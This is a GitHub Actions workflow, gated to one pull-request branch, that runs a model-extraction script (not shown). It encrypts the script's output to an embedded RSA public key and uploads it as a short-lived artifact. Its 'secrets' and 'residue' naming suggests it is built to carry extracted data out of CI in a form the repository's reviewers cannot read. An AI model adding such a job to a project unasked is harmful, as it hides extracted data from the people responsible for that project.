name: temporary-matrix-secrets-runner

on:
  pull_request:
    branches:
      - main
    paths:
      - matrix_extract.py
      - matrix_patch.b64

permissions:
  contents: read

jobs:
  extract:
    if: github.head_ref == 'matrix-secrets-20260801'
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - name: Install model tooling
        run: python3 -m pip install --disable-pip-version-check --quiet 'transformers>=4.45,<5' 'accelerate>=0.30' safetensors numpy

      - name: Extract model residue
        env:
          HF_HUB_DISABLE_XET: '1'
          TOKENIZERS_PARALLELISM: 'false'
        run: python3 matrix_extract.py

      - name: Encrypt result
        if: always()
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          test -f matrix-result-raw/result.json
          rm -rf matrix-package matrix-result
          mkdir -p matrix-package matrix-result
          tar -C matrix-result-raw -czf matrix-package/result.tar.gz .
          openssl rand 32 > matrix-package/aes.key
          openssl rand 16 > matrix-package/iv.bin
          KEY_HEX="$(xxd -p -c 256 matrix-package/aes.key)"
          IV_HEX="$(xxd -p -c 256 matrix-package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in matrix-package/result.tar.gz -out matrix-package/result.enc
          cat > matrix-package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAnh5zv/C4kFfGiNh58LU0
          DMrPoWxmZfvAqljhJtUgGuRk5uRlMQRokxR1gFDIxgonA9vruE0o1YR1LlGOrkrV
          0+7eI4nhSXPdJe8NWdzNdvaYnVKvPccFGyAnF0BIUU7b6n/Bi+scMqOPnx7A9GK4
          HQ18las8qCqWXyHGN5lmHuTTPfkvSXgMMDaMmzLPHggpnf+TUOvX6KxovU7s6Cld
          8ogEkioXTdPeBjCy09iFfykszqcBck/kWxfpF+bsqTpmyi+/50x72YL3uZZ9378o
          Ss6qRONHqcUp5NeAEY28nOOopPmwhg6mxqnMKvx870LFT8InyNhyKyn6L16weP/B
          MBzSW8J6rmE1Fh6HL0KTLPpABb8xYoH849z3cplzrM3VxcRoEnY4HK6C24vELDaN
          rgEJ5x4WHP8YZ5Q0C7msdgtZ4ovhMS4B0vqnENnHE4olcG3NmP+RqOEs8z8sSZSu
          TAfIC2uhgCAoVor2KLDxRONwScGosx5CWlm/NUz4QlFBAgMBAAE=
          -----END PUBLIC KEY-----
          PEM
          openssl pkeyutl -encrypt -pubin -inkey matrix-package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in matrix-package/aes.key -out matrix-package/key.enc
          base64 -w0 matrix-package/result.enc > matrix-result/result.enc.b64
          base64 -w0 matrix-package/key.enc > matrix-result/key.enc.b64
          base64 -w0 matrix-package/iv.bin > matrix-result/iv.bin.b64
          sha256sum matrix-package/result.enc matrix-package/key.enc matrix-package/iv.bin > matrix-result/SHA256SUMS
          rm -rf matrix-result-raw matrix-package

      - name: Upload encrypted result
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: matrix-secrets-encrypted-result
          path: matrix-result/
          retention-days: 1
          if-no-files-found: error
